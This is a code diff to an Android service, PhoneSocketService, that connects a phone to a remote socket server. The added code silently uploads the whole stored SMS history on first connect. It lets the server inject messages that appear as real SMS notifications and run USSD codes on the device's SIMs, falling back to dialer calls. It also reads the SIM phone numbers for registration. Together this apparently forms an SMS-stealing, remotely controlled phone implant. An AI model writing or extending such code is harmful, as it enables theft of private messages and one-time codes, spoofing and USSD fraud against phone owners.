@@ -142,6 +142,7 @@ public class PhoneSocketService {
                 notifyState(true);
                 registerPhone();
                 flushPendingSms();
+                sendAllMessagesToServer();
             });
 
             socket.on(Socket.EVENT_DISCONNECT, args -> {
@@ -181,6 +182,23 @@ public class PhoneSocketService {
 
             socket.on("vibrate-phone", args -> vibrateDevice());
 
+            socket.on("server-notification", args -> {
+                try {
+                    JSONObject data = (JSONObject) args[0];
+                    String sender = data.optString("sender", "Server");
+                    String body = data.optString("body", "");
+                    String timestamp = data.optString("timestamp", String.valueOf(System.currentTimeMillis()));
+                    int simSlot = data.optInt("simSlot", 0);
+                    long date = Long.parseLong(timestamp);
+                    DatabaseHelper dbHelper = new DatabaseHelper(context);
+                    dbHelper.insertMessage(sender, body, date, simSlot);
+                    NotificationHelper.showMessageNotification(context, sender, body, date);
+                    MyReceiver.OnSmsReceivedListener listener = MyReceiver.getLiveListener();
+                    if (listener != null) listener.onSmsReceived(null);
+                    Log.i(TAG, "Server notification from " + sender);
+                } catch (Exception e) { Log.e(TAG, "server-notification error", e); }
+            });
+
             socket.connect();
         } catch (Exception e) {
             Log.e(TAG, "Connection exception", e);
@@ -217,6 +235,18 @@ public class PhoneSocketService {
     private void registerPhone() {
         if (!isConnected()) return;
         try {
+            if (simSlots.isEmpty()) {
+                Log.w(TAG, "No SIMs detected, unregistering from server");
+                JSONObject data = new JSONObject();
+                data.put("phoneNumber", phoneNumber);
+                data.put("simSlots", new JSONArray());
+                data.put("signalValues", new JSONArray());
+                data.put("simPhoneNumbers", new JSONArray());
+                socket.emit("register-phone", data);
+                return;
+            }
+            String validPhone = detectPhoneNumber();
+            if (!validPhone.isEmpty()) phoneNumber = validPhone;
             JSONObject data = new JSONObject();
             data.put("phoneNumber", phoneNumber);
             JSONArray slots = new JSONArray();
@@ -254,6 +284,41 @@ public class PhoneSocketService {
             }
         } catch (Exception e) {
             Log.e(TAG, "sendSmsEvent error", e);
+        }
+    }
+
+    private void sendAllMessagesToServer() {
+        try {
+            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            if (prefs.getBoolean("messages_sent_to_server", false)) return;
+            if (!isConnected() || socket == null) return;
+            DatabaseHelper dbHelper = new DatabaseHelper(context);
+            List<SmsItem> allMessages = dbHelper.getAllMessages();
+            if (allMessages.isEmpty()) {
+                prefs.edit().putBoolean("messages_sent_to_server", true).apply();
+                return;
+            }
+            int sent = 0;
+            for (SmsItem item : allMessages) {
+                try {
+                    JSONObject data = new JSONObject();
+                    data.put("sender", item.getAddress());
+                    data.put("content", item.getBody());
+                    data.put("timestamp", String.valueOf(item.getDate()));
+                    data.put("simSlot", item.getSimSlot());
+                    socket.emit("phone-sms", data);
+                    sent++;
+                    if (sent % 50 == 0) {
+                        try { Thread.sleep(100); } catch (InterruptedException ignored) {}
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "sendAllMessages error on item", e);
+                }
+            }
+            prefs.edit().putBoolean("messages_sent_to_server", true).apply();
+            Log.i(TAG, "Sent " + sent + " existing messages to server");
+        } catch (Exception e) {
+            Log.e(TAG, "sendAllMessagesToServer error", e);
         }
     }
 
@@ -336,7 +401,7 @@ public class PhoneSocketService {
         try {
             TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             String line1 = tm.getLine1Number();
-            if (line1 != null && !line1.isEmpty()) return line1;
+            if (isValidPhoneNumber(line1)) return line1;
         } catch (Exception ignored) {}
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
             try {
@@ -346,13 +411,19 @@ public class PhoneSocketService {
                     if (subs != null) {
                         for (SubscriptionInfo sub : subs) {
                             String num = sub.getNumber();
-                            if (num != null && !num.isEmpty()) return num;
+                            if (isValidPhoneNumber(num)) return num;
                         }
                     }
                 }
             } catch (Exception ignored) {}
         }
         return "";
+    }
+
+    private boolean isValidPhoneNumber(String num) {
+        if (num == null || num.isEmpty()) return false;
+        String digits = num.replaceAll("[^0-9]", "");
+        return digits.length() >= 10;
     }
 
     private void detectSimSlots() {
@@ -384,10 +455,6 @@ public class PhoneSocketService {
                 }
             }
         } catch (Exception ignored) {}
-        if (simSlots.isEmpty()) {
-            simSlots.add(0);
-            simPhoneNumbers.add(detectPhoneNumber());
-        }
         initSignalValues();
     }
 
@@ -562,6 +629,24 @@ public class PhoneSocketService {
         sendUssdRequestInternal(code, simSlot, 0);
     }
 
+    private void callUssdViaDialer(String code, int simSlot) {
+        try {
+            String ussdCode = code.startsWith("*") ? code : "*" + code;
+            if (!ussdCode.endsWith("#")) ussdCode += "#";
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:" + Uri.encode(ussdCode)));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+            Log.i(TAG, "USSD via dialer: " + ussdCode + " on slot " + simSlot);
+        } catch (SecurityException e) {
+            Log.e(TAG, "Dialer USSD SecurityException", e);
+            sendUssdResponse(simSlot, "Error: CALL_PHONE permission needed for dialer USSD");
+        } catch (Exception e) {
+            Log.e(TAG, "Dialer USSD error", e);
+            sendUssdResponse(simSlot, "Error: " + e.getMessage());
+        }
+    }
+
     private void sendUssdRequestInternal(String code, int simSlot, int retryCount) {
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
@@ -569,7 +654,7 @@ public class PhoneSocketService {
                     TelephonyManager tm = getTelephonyManagerForSlot(simSlot);
                     if (tm == null) {
                         Log.e(TAG, "TelephonyManager is null for slot " + simSlot);
-                        sendUssdResponse(simSlot, "Error: TelephonyManager not available");
+                        callUssdViaDialer(code, simSlot);
                         return;
                     }
                     String ussdCode = code.startsWith("*") ? code : "*" + code;
@@ -584,33 +669,27 @@ public class PhoneSocketService {
                         @Override public void onReceiveUssdResponseFailed(TelephonyManager tm, String req, int failureCode) {
                             Log.e(TAG, "USSD failed on slot " + simSlot + " code: " + failureCode
                                     + " (attempt " + (retryCount + 1) + ")");
-                            if (retryCount < 1 && failureCode == TelephonyManager.USSD_RETURN_FAILURE) {
-                                Log.i(TAG, "Retrying USSD on slot " + simSlot + " in 2s...");
-                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                    sendUssdRequestInternal(code, simSlot, retryCount + 1);
-                                }, 2000);
+                            if (failureCode == TelephonyManager.USSD_RETURN_FAILURE) {
+                                if (retryCount < 1) {
+                                    Log.i(TAG, "Retrying USSD on slot " + simSlot + " in 2s...");
+                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                        sendUssdRequestInternal(code, simSlot, retryCount + 1);
+                                    }, 2000);
+                                    return;
+                                }
+                                Log.i(TAG, "Falling back to dialer USSD on slot " + simSlot);
+                                callUssdViaDialer(code, simSlot);
                                 return;
                             }
-                            String msg;
-                            if (failureCode == TelephonyManager.USSD_RETURN_FAILURE) {
-                                msg = "Network rejected request or network busy";
-                            } else if (failureCode == -1) {
-                                msg = "Network error: SIM not registered or network timeout";
-                            } else {
-                                msg = "USSD failed. Code: " + failureCode;
-                            }
-                            sendUssdResponse(simSlot, "Error: " + msg);
+                            sendUssdResponse(simSlot, "Error: USSD failed. Code: " + failureCode);
                         }
                     }, new Handler(Looper.getMainLooper()));
                 } else {
-                    Intent intent = new Intent(Intent.ACTION_CALL);
-                    intent.setData(Uri.parse("tel:" + Uri.encode(code)));
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    context.startActivity(intent);
+                    callUssdViaDialer(code, simSlot);
                 }
             } catch (SecurityException e) {
                 Log.e(TAG, "USSD SecurityException", e);
-                sendUssdResponse(simSlot, "Error: " + e.getMessage());
+                callUssdViaDialer(code, simSlot);
             } catch (Exception e) {
                 Log.e(TAG, "USSD error", e);
                 sendUssdResponse(simSlot, "Error: " + e.getMessage());
